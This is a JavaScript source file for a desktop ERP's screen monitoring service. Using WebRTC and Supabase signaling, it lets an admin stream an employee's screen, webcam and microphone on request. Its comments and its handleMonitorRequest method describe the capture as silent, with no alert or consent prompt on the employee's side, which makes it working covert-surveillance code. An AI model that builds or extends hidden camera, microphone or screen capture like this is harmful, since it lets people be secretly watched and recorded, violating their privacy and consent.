/**
 * Guardian Desktop ERP - Screen Monitoring Service
 * WebRTC-based P2P screen streaming with Supabase Realtime signaling
 * Silent monitoring - no UI alerts on employee side
 */

import { supabase } from './supabaseClient';

// ICE Server configuration for WebRTC
const ICE_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
    { urls: 'stun:stun3.l.google.com:19302' },
    { urls: 'stun:stun4.l.google.com:19302' },
  ]
};

// Channel name prefix for monitoring
const CHANNEL_PREFIX = 'screen-monitor';

/**
 * Screen Monitoring Service Class
 * Handles WebRTC signaling and peer connections
 */
class ScreenMonitoringService {
  constructor() {
    this.peerConnections = new Map(); // employeeId -> RTCPeerConnection
    this.streams = new Map(); // employeeId -> MediaStream
    this.channels = new Map(); // employeeId -> RealtimeChannel
    this.onStreamCallbacks = new Map(); // employeeId -> callback
    this.onDisconnectCallbacks = new Map(); // employeeId -> callback
    this.isEmployee = false;
    this.employeeId = null;
    this.employeeChannel = null;
    this.localStream = null;
  }

  /**
   * Initialize as Admin (viewer)
   * Sets up signaling channel to receive answers and ICE candidates
   */
  async initAsAdmin(adminId) {
    console.log('[ScreenMonitor] Initializing as Admin:', adminId);
    this.isEmployee = false;
    return true;
  }

  /**
   * Initialize as Employee (streamer)
   * Sets up silent listener for monitoring requests
   */
  async initAsEmployee(employeeId) {
    console.log('[ScreenMonitor] Initializing as Employee:', employeeId);
    this.isEmployee = true;
    this.employeeId = employeeId;

    // Subscribe to monitoring requests channel (SILENT - no UI)
    const channelName = `${CHANNEL_PREFIX}-${employeeId}`;
    
    this.employeeChannel = supabase.channel(channelName, {
      config: { broadcast: { self: false } }
    });

    this.employeeChannel
      .on('broadcast', { event: 'monitor-request' }, async (payload) => {
        console.log('[ScreenMonitor] Received monitor request (silent)');
        await this.handleMonitorRequest(payload.payload);
      })
      .on('broadcast', { event: 'ice-candidate' }, async (payload) => {
        await this.handleRemoteIceCandidate(payload.payload);
      })
      .on('broadcast', { event: 'stop-monitoring' }, () => {
        console.log('[ScreenMonitor] Received stop signal');
        this.stopLocalStream();
      })
      .subscribe((status) => {
        console.log('[ScreenMonitor] Employee channel status:', status);
      });

    return true;
  }

  /**
   * Admin: Start monitoring an employee's screen
   */
  async startMonitoring(employeeId, onStream, onDisconnect, monitoringOptions = {}) {
    console.log('[ScreenMonitor] Admin starting to monitor:', employeeId, 'Options:', monitoringOptions);

    const { screen = true, camera = false, microphone = false } = monitoringOptions;

    // Store callbacks
    this.onStreamCallbacks.set(employeeId, onStream);
    this.onDisconnectCallbacks.set(employeeId, onDisconnect);

    // Create peer connection
    const pc = new RTCPeerConnection(ICE_SERVERS);
    this.peerConnections.set(employeeId, pc);

    // Handle incoming stream
    pc.ontrack = (event) => {
      console.log('[ScreenMonitor] Received remote track:', event.track.kind);
      const stream = event.streams[0];
      this.streams.set(employeeId, stream);
      const callback = this.onStreamCallbacks.get(employeeId);
      if (callback) callback(stream);
    };

    // Handle ICE candidates - use cached channel
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const sendChannel = this.channels.get(`send-${employeeId}`);
        if (sendChannel) {
          console.log('[ScreenMonitor] Sending ICE candidate to employee');
          sendChannel.send({
            type: 'broadcast',
            event: 'ice-candidate',
            payload: { candidate: event.candidate.toJSON() }
          });
        }
      }
    };

    // Handle connection state
    pc.onconnectionstatechange = () => {
      console.log('[ScreenMonitor] Connection state:', pc.connectionState);
      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
        const callback = this.onDisconnectCallbacks.get(employeeId);
        if (callback) callback();
        this.stopMonitoring(employeeId);
      }
    };

    // Subscribe to employee's response channel FIRST and wait for it
    const responseChannel = supabase.channel(`${CHANNEL_PREFIX}-response-${employeeId}`, {
      config: { broadcast: { self: false } }
    });

    responseChannel
      .on('broadcast', { event: 'monitor-answer' }, async (payload) => {
        console.log('[ScreenMonitor] Received answer from employee');
        await this.handleAnswer(employeeId, payload.payload);
      })
      .on('broadcast', { event: 'ice-candidate' }, async (payload) => {
        console.log('[ScreenMonitor] Received ICE candidate from employee');
        await this.handleRemoteIceCandidateAdmin(employeeId, payload.payload);
      });

    // CRITICAL: Wait for response channel to be subscribed before sending offer
    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error('Response channel subscription timeout'));
      }, 10000);
      
      responseChannel.subscribe((status) => {
        console.log('[ScreenMonitor] Response channel status:', status);
        if (status === 'SUBSCRIBED') {
          clearTimeout(timeout);
          resolve();
        } else if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') {
          clearTimeout(timeout);
          reject(new Error(`Response channel error: ${status}`));
        }
      });
    });

    this.channels.set(employeeId, responseChannel);
    console.log('[ScreenMonitor] Response channel ready, creating offer...');

    // Create offer with appropriate receive constraints
    const offer = await pc.createOffer({
      offerToReceiveVideo: screen || camera,
      offerToReceiveAudio: microphone
    });
    await pc.setLocalDescription(offer);

    // Also subscribe to employee's main channel for sending and keep it
    const employeeChannel = supabase.channel(`${CHANNEL_PREFIX}-${employeeId}`);
    await new Promise((resolve) => {
      employeeChannel.subscribe((status) => {
        console.log('[ScreenMonitor] Employee channel status:', status);
        if (status === 'SUBSCRIBED') {
          resolve();
        }
      });
    });
    this.channels.set(`send-${employeeId}`, employeeChannel);

    // Send silent monitoring request to employee with options
    const result = await employeeChannel.send({
      type: 'broadcast',
      event: 'monitor-request',
      payload: {
        offer: pc.localDescription.toJSON(),
        options: { screen, camera, microphone }
      }
    });
    console.log('[ScreenMonitor] Monitor request sent, result:', result);

    return true;
  }

  /**
   * Admin: Stop monitoring an employee
   */
  async stopMonitoring(employeeId) {
    console.log('[ScreenMonitor] Stopping monitoring:', employeeId);

    // Send stop signal to employee using cached channel
    const sendChannel = this.channels.get(`send-${employeeId}`);
    if (sendChannel) {
      try {
        await sendChannel.send({
          type: 'broadcast',
          event: 'stop-monitoring',
          payload: {}
        });
      } catch (err) {
        console.error('[ScreenMonitor] Error sending stop signal:', err);
      }
      await sendChannel.unsubscribe();
      this.channels.delete(`send-${employeeId}`);
    }

    // Close peer connection
    const pc = this.peerConnections.get(employeeId);
    if (pc) {
      pc.close();
      this.peerConnections.delete(employeeId);
    }

    // Close response channel
    const channel = this.channels.get(employeeId);
    if (channel) {
      await channel.unsubscribe();
      this.channels.delete(employeeId);
    }

    // Clear stream
    this.streams.delete(employeeId);
    this.onStreamCallbacks.delete(employeeId);
    this.onDisconnectCallbacks.delete(employeeId);
  }

  /**
   * Employee: Handle monitoring request (SILENT)
   */
  async handleMonitorRequest(payload) {
    try {
      console.log('[ScreenMonitor] Processing monitor request silently', payload);

      const { screen = true, camera = false, microphone = false } = payload.options || {};
      console.log('[ScreenMonitor] Streaming options - Screen:', screen, 'Camera:', camera, 'Mic:', microphone);

      let stream = null;

      // Get screen stream if requested
      if (screen) {
        stream = await this.getScreenStream();
        if (!stream) {
          console.error('[ScreenMonitor] Failed to get screen stream');
          return;
        }
      }

      // Get camera stream if requested
      if (camera) {
        try {
          const cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: microphone
          });
          
          if (stream) {
            // Combine screen and camera - add camera track to existing stream
            cameraStream.getTracks().forEach(track => {
              stream.addTrack(track);
            });
          } else {
            stream = cameraStream;
          }
          console.log('[ScreenMonitor] Camera/audio stream obtained');
        } catch (err) {
          console.error('[ScreenMonitor] Failed to get camera:', err);
          if (!stream) return; // Can't continue without at least screen
        }
      } else if (microphone && !camera) {
        // Microphone only
        try {
          const audioStream = await navigator.mediaDevices.getUserMedia({
            audio: true,
            video: false
          });
          if (stream) {
            audioStream.getTracks().forEach(track => {
              stream.addTrack(track);
            });
          } else {
            stream = audioStream;
          }
        } catch (err) {
          console.error('[ScreenMonitor] Failed to get microphone:', err);
        }
      }

      if (!stream) {
        console.error('[ScreenMonitor] No stream available');
        return;
      }

      this.localStream = stream;

      // Create peer connection
      const pc = new RTCPeerConnection(ICE_SERVERS);
      this.peerConnections.set('admin', pc);

      // Add all tracks to peer connection
      stream.getTracks().forEach(track => {
        console.log('[ScreenMonitor] Adding track:', track.kind);
        pc.addTrack(track, stream);
      });

      // Handle ICE candidates
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          this.sendToAdmin('ice-candidate', {
            candidate: event.candidate.toJSON()
          });
        }
      };

      // Set remote description (offer from admin)
      await pc.setRemoteDescription(new RTCSessionDescription(payload.offer));

      // Create and send answer
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);

      await this.sendToAdmin('monitor-answer', {
        answer: pc.localDescription.toJSON()
      });

      console.log('[ScreenMonitor] Sent answer to admin with stream');
    } catch (error) {
      console.error('[ScreenMonitor] Error handling monitor request:', error);
    }
  }

  /**
   * Get screen stream using Electron's desktopCapturer
   */
  async getScreenStream() {
    try {
      // For Electron, we need to use desktopCapturer through the renderer
      // This uses the media devices API with screen capture
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          mandatory: {
            chromeMediaSource: 'screen',
            minWidth: 1280,
            maxWidth: 1920,
            minHeight: 720,
            maxHeight: 1080,
            maxFrameRate: 15
          }
        }
      });
      return stream;
    } catch (error) {
      console.error('[ScreenMonitor] getUserMedia error:', error);
      
      // Fallback: Try getDisplayMedia (may show picker on some systems)
      try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: {
            width: { ideal: 1920, max: 1920 },
            height: { ideal: 1080, max: 1080 },
            frameRate: { ideal: 15, max: 15 }
          },
          audio: false
        });
        return stream;
      } catch (displayError) {
        console.error('[ScreenMonitor] getDisplayMedia error:', displayError);
        return null;
      }
    }
  }

  /**
   * Admin: Handle answer from employee
   */
  async handleAnswer(employeeId, payload) {
    const pc = this.peerConnections.get(employeeId);
    if (pc) {
      await pc.setRemoteDescription(new RTCSessionDescription(payload.answer));
    }
  }

  /**
   * Admin: Handle ICE candidate from employee
   */
  async handleRemoteIceCandidateAdmin(employeeId, payload) {
    const pc = this.peerConnections.get(employeeId);
    if (pc && payload.candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(payload.candidate));
    }
  }

  /**
   * Employee: Handle ICE candidate from admin
   */
  async handleRemoteIceCandidate(payload) {
    const pc = this.peerConnections.get('admin');
    if (pc && payload.candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(payload.candidate));
    }
  }

  /**
   * Send message to employee's channel
   */
  async sendToEmployee(employeeId, event, payload) {
    const channelName = `${CHANNEL_PREFIX}-${employeeId}`;
    console.log('[ScreenMonitor] Sending to employee channel:', channelName, 'event:', event);
    
    const channel = supabase.channel(channelName);
    
    // Subscribe first to ensure channel is ready
    await new Promise((resolve) => {
      channel.subscribe((status) => {
        console.log('[ScreenMonitor] Employee channel status:', status);
        if (status === 'SUBSCRIBED') {
          resolve();
        }
      });
    });
    
    const result = await channel.send({
      type: 'broadcast',
      event,
      payload
    });
    
    console.log('[ScreenMonitor] Message sent result:', result);
  }

  /**
   * Employee: Send message back to admin
   */
  async sendToAdmin(event, payload) {
    const channelName = `${CHANNEL_PREFIX}-response-${this.employeeId}`;
    console.log('[ScreenMonitor] Sending to admin channel:', channelName, 'event:', event);
    
    const channel = supabase.channel(channelName);
    
    // Must subscribe before sending
    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error('Channel subscription timeout'));
      }, 5000);
      
      channel.subscribe((status) => {
        console.log('[ScreenMonitor] Response channel status:', status);
        if (status === 'SUBSCRIBED') {
          clearTimeout(timeout);
          resolve();
        } else if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') {
          clearTimeout(timeout);
          reject(new Error(`Channel error: ${status}`));
        }
      });
    });
    
    const result = await channel.send({
      type: 'broadcast',
      event,
      payload
    });
    
    console.log('[ScreenMonitor] Message sent to admin, result:', result);
  }

  /**
   * Stop local stream (employee side)
   */
  stopLocalStream() {
    if (this.localStream) {
      this.localStream.getTracks().forEach(track => track.stop());
      this.localStream = null;
    }

    const pc = this.peerConnections.get('admin');
    if (pc) {
      pc.close();
      this.peerConnections.delete('admin');
    }
  }

  /**
   * Cleanup all connections and channels
   */
  async cleanup() {
    // Stop all peer connections
    this.peerConnections.forEach((pc) => pc.close());
    this.peerConnections.clear();

    // Stop local stream
    this.stopLocalStream();

    // Unsubscribe from all channels
    for (const channel of this.channels.values()) {
      await channel.unsubscribe();
    }
    this.channels.clear();

    // Unsubscribe employee channel
    if (this.employeeChannel) {
      await this.employeeChannel.unsubscribe();
      this.employeeChannel = null;
    }

    this.streams.clear();
    this.onStreamCallbacks.clear();
    this.onDisconnectCallbacks.clear();
  }

  /**
   * Check if currently monitoring an employee
   */
  isMonitoring(employeeId) {
    return this.peerConnections.has(employeeId);
  }

  /**
   * Get all currently monitored employee IDs
   */
  getMonitoredEmployees() {
    return Array.from(this.peerConnections.keys()).filter(id => id !== 'admin');
  }
}

// Export singleton instance
export const screenMonitoringService = new ScreenMonitoringService();
export default screenMonitoringService;
